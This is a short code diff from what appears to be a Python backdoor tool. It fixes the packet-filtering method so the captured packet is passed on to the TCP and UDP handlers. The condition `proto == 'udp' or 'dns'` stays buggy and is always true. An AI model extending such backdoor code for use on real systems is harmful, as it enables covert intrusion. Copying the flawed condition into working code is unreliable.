@@ -346,9 +346,9 @@ class BackDoor:
 
     def filter_packets(self, packet) -> None:
         if self.proto == "tcp":
-            self.process_tcp()
+            self.process_tcp(packet)
         elif self.proto == "udp" or "dns":
-            self.process_udp()
+            self.process_udp(packet)
         else:
             return
 
